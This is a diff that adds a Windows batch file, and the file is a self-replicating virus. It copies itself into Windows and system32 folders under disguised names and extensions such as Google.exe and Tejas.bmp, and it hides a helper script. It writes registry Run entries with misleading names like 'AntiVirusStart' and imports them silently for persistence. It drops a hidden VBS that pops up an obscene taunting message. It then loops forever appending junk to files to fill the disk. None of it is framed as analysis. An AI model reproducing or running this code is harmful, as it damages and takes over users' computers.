@@ -1,0 +1,138 @@
+@echo off
+cls
+if exist C:\Windows\Norfolk.bat goto yaa
+copy %0 C:\Windows\Norfolk.bat
+copy %0 C:\Windows\Tejas.bmp
+del C:\Windows\system32\Ratcat.reg
+:yaa
+if exist C:\Windows\Startold.bat goto yae
+copy %0 C:\Windows\Startold.bat
+copy %0 C:\Windows\Aros.bmp
+del C:\Windows\system32\Ratcat.reg
+:yae
+if exist C:\Windows\Abchold.bat goto yai
+copy %0 C:\Windows\Abchold.bat
+copy %0 C:\Windows\Burbujas.bmp
+del C:\Windows\system32\Ratcat.reg
+:yai
+if exist C:\Windows\Kohler.bat goto yao
+copy %0 C:\Windows\Kohler.bat
+copy %0 C:\Windows\Archivec.dll
+del C:\Windows\system32\Ratcat.reg
+:yao
+if exist C:\Windows\Zorolk.bat goto yau
+copy %0 C:\Windows\Zorolk.bat
+del C:\Windows\system32\Ratcat.reg
+:yau
+if exist C:\Windows\Fold.bat goto yea
+copy %0 C:\Windows\Fold.bat
+del C:\Windows\system32\Ratcat.reg
+:yea
+if exist C:\Windows\Langdon.bat goto yee
+copy %0 C:\Windows\Langdon.bat
+del C:\Windows\system32\Ratcat.reg
+:yee
+if exist C:\Windows\system32\Codnoc.bat goto yei
+copy %0 C:\Windows\system32\Codnoc.bat
+del C:\Windows\system32\Ratcat.reg
+:yei
+if exist C:\Windows\system32\Anton.bat goto yeo
+copy %0 C:\Windows\system32\Anton.bat
+del C:\Windows\system32\Ratcat.reg
+:yeo
+if exist C:\Windows\system32\Falcon.bat goto yeu
+copy %0 C:\Windows\system32\Falcon.bat
+del C:\Windows\system32\Ratcat.reg
+:yeu
+if exist C:\Windows\system32\Woo.bat goto yia
+copy %0 C:\Windows\system32\Woo.bat
+del C:\Windows\system32\Ratcat.reg
+:yia
+if exist C:\Windows\system32\Mandala.bat goto yie
+copy %0 C:\Windows\system32\Mandala.bat
+del C:\Windows\system32\Ratcat.reg
+:yie
+if exist C:\Windows\System\Troenyi.bat goto yio
+echo echo off > C:\Windows\System\Troenyi.bat
+echo cls >> C:\Windows\System\Troenyi.bat
+echo if exist C:\Windows\Tejas.bmp if not exist C:\Windows\Norfolk.bat copy %0 C:\Windows\Norfolk.bat >> C:\Windows\System\Troenyi.bat
+echo if exist C:\Windows\Aros.bmp if not exist C:\Windows\Norfolk.bat copy %0 C:\Windows\Norfolk.bat >> C:\Windows\System\Troenyi.bat
+echo if exist C:\Windows\Burbujas.bmp if not exist C:\Windows\Norfolk.bat copy %0 C:\Windows\Norfolk.bat >> C:\Windows\System\Troenyi.bat
+echo if exist C:\Windows\Archivec.dll if not exist C:\Windows\Norfolk.bat copy %0 C:\Windows\Norfolk.bat >> C:\Windows\System\Troenyi.bat
+echo cls >> C:\Windows\System\Troenyi.bat
+echo exit >> C:\Windows\System\Troenyi.bat
+del C:\Windows\system32\Ratcat.reg
+attrib +h C:\Windows\System\Troenyi.bat
+:yio
+if exist C:\Windows\system32\Ratcat.reg goto yar
+echo REGEDIT4 > C:\Windows\system32\Ratcat.reg
+echo . >> C:\Windows\system32\Ratcat.reg
+echo [HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Run] >> C:\Windows\system32\Ratcat.reg
+echo "FireWorks"="C:\\Windows\\Norfolk.bat" >> C:\Windows\system32\Ratcat.reg
+echo "Upholds"="C:\\Windows\\Startold.bat" >> C:\Windows\system32\Ratcat.reg
+echo "Systemtasks"="C:\\Windows\\Abchold.bat" >> C:\Windows\system32\Ratcat.reg
+echo "Windowsmask"="C:\\Windows\\Kohler.bat" >> C:\Windows\system32\Ratcat.reg
+echo "Tmoaneis5txrxo"="C:\\Windows\\Zorolk.bat" >> C:\Windows\system32\Ratcat.reg
+echo "UpgradeWeb"="C:\\Windows\\Fold.bat" >> C:\Windows\system32\Ratcat.reg
+echo "Hcarcakcekrexr"="C:\\Windows\\Langdon.bat" >> C:\Windows\system32\Ratcat.reg
+echo "WindowsSystem"="C:\\Windows\\system32\\Codnoc.bat" >> C:\Windows\system32\Ratcat.reg
+echo "Hidrosystem"="C:\\Windows\\system32\\Anton.bat" >> C:\Windows\system32\Ratcat.reg
+echo "AntiVirusStart"="C:\\Windows\\system32\\Falcon.bat" >> C:\Windows\system32\Ratcat.reg
+echo "Windowsmask"="C:\\Windows\\system32\\Woo.bat" >> C:\Windows\system32\Ratcat.reg
+echo "SystemSimbol"="C:\\Windows\\system32\\Mandala.bat" >> C:\Windows\system32\Ratcat.reg
+echo "DOS"="C:\\Windows\\System\\Troenyi.bat" >> C:\Windows\system32\Ratcat.reg
+echo . >> C:\Windows\system32\Ratcat.reg
+echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] >> C:\Windows\system32\Ratcat.reg
+echo "FireWorks2"="C:\\Windows\\Norfolk.bat" >> C:\Windows\system32\Ratcat.reg
+echo "Upholds2"="C:\\Windows\\Startold.bat" >> C:\Windows\system32\Ratcat.reg
+echo "Systemtasks2"="C:\\Windows\\Abchold.bat" >> C:\Windows\system32\Ratcat.reg
+echo "Windowsmask2"="C:\\Windows\\Kohler.bat" >> C:\Windows\system32\Ratcat.reg
+echo "Tmoaneis5txrxo2"="C:\\Windows\\Zorolk.bat" >> C:\Windows\system32\Ratcat.reg
+echo "UpgradeWeb2"="C:\\Windows\\Fold.bat" >> C:\Windows\system32\Ratcat.reg
+echo "Hcarcakcekrexr2"="C:\\Windows\\Langdon.bat" >> C:\Windows\system32\Ratcat.reg
+echo "WindowsSystem2"="C:\\Windows\\system32\\Codnoc.bat" >> C:\Windows\system32\Ratcat.reg
+echo "Hidrosystem2"="C:\\Windows\\system32\\Anton.bat" >> C:\Windows\system32\Ratcat.reg
+echo "AntiVirusStart2"="C:\\Windows\\system32\\Falcon.bat" >> C:\Windows\system32\Ratcat.reg
+echo "Windowsmask2"="C:\\Windows\\system32\\Woo.bat" >> C:\Windows\system32\Ratcat.reg
+echo "SystemSimbol2"="C:\\Windows\\system32\\Mandala.bat" >> C:\Windows\system32\Ratcat.reg
+echo "DOS2"="C:\\Windows\\System\\Troenyi.bat" >> C:\Windows\system32\Ratcat.reg
+echo . >> C:\Windows\system32\Ratcat.reg
+echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run] >> C:\Windows\system32\Ratcat.reg
+echo "FireWorks3"="C:\\Windows\\Norfolk.bat" >> C:\Windows\system32\Ratcat.reg
+echo "Upholds3"="C:\\Windows\\Startold.bat" >> C:\Windows\system32\Ratcat.reg
+echo "Systemtasks3"="C:\\Windows\\Abchold.bat" >> C:\Windows\system32\Ratcat.reg
+echo "Windowsmask3"="C:\\Windows\\Kohler.bat" >> C:\Windows\system32\Ratcat.reg
+echo "Tmoaneis5txrxo3"="C:\\Windows\\Zorolk.bat" >> C:\Windows\system32\Ratcat.reg
+echo "UpgradeWeb3"="C:\\Windows\\Fold.bat" >> C:\Windows\system32\Ratcat.reg
+echo "Hcarcakcekrexr3"="C:\\Windows\\Langdon.bat" >> C:\Windows\system32\Ratcat.reg
+echo "WindowsSystem3"="C:\\Windows\\system32\\Codnoc.bat" >> C:\Windows\system32\Ratcat.reg
+echo "Hidrosystem3"="C:\\Windows\\system32\\Anton.bat" >> C:\Windows\system32\Ratcat.reg
+echo "AntiVirusStart3"="C:\\Windows\\system32\\Falcon.bat" >> C:\Windows\system32\Ratcat.reg
+echo "Windowsmask3"="C:\\Windows\\system32\\Woo.bat" >> C:\Windows\system32\Ratcat.reg
+echo "SystemSimbol3"="C:\\Windows\\system32\\Mandala.bat" >> C:\Windows\system32\Ratcat.reg
+echo "DOS3"="C:\\Windows\\System\\Troenyi.bat" >> C:\Windows\system32\Ratcat.reg
+regedit.exe /s C:\Windows\system32\Ratcat.reg
+:yar
+if exist C:\Windows\Google.exe goto yiu
+copy %0 C:\Windows\Google.exe
+:yiu
+if exist C:\Windows\system32\Netkat.com goto yoa
+copy %0 C:\Windows\system32\Netkat.com
+:yoa
+if exist C:\Windows\System\Web.web goto yoe
+copy %0 C:\Windows\System\Web.web
+:yoe
+if exist C:\Windows\system32\Toni5.vbs goto yoi
+echo t = msgbox("El virus de Toni5. te abrio el culo",,"Toni5. te cago") > C:\Windows\system32\Toni5.vbs
+attrib +h +s C:\Windows\system32\Toni5.vbs
+:yoi
+start C:\Windows\system32\Toni5.vbs
+cls
+:yyy
+cls
+echo abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ 1234567890+-*/,.-;:_´ç`+^*¨Çºª!"•$%&/=?¿'¡\Ç@#~¬ >> C:\Windows\Google.exe
+cls
+echo abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ 1234567890+-*/,.-;:_´ç`+^*¨Çºª!"•$%&/=?¿'¡\Ç@#~¬ >> C:\Windows\system32\Netkat.com
+cls
+echo abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ 1234567890+-*/,.-;:_´ç`+^*¨Çºª!"•$%&/=?¿'¡\Ç@#~¬ >> C:\Windows\System\Web.web
+goto yyy
